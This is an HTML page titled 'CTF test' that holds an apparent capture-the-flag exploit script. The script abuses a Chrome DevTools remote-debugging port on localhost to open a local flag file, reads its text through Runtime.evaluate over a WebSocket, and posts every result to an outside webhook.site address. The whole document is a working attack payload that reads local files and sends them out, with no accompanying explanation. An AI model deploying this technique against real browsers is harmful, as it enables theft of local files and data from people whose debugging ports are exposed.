<!doctype html>
<meta charset="utf-8">
<title>CTF test</title>
<script>
(async () => {
  const hook = "https://webhook.site/2282d57b-95b2-4244-bd6c-118059bc5963";
  const report = async (data) => {
    await fetch(hook, {
      method: "POST",
      mode: "no-cors",
      body: String(data)
    });
  };

  try {
    const path = "/challenge/flag-53035d3cba0664dfac37ff64b6e0f86e";
    const response = await fetch(
      "http://localhost:9222/json/new?file://" + path,
      { method: "PUT" }
    );
    const tab = await response.json();
    await report("DevTools tab: " + JSON.stringify(tab));

    const ws = new WebSocket(tab.webSocketDebuggerUrl);

    ws.onopen = () => {
      ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: { expression: "document.body.innerText" }
      }));
    };

    ws.onmessage = async (event) => {
      await report("DevTools result: " + event.data);
    };

    ws.onerror = () => report("WebSocket error");
  } catch (error) {
    await report("Error: " + error.message);
  }
})();
</script>
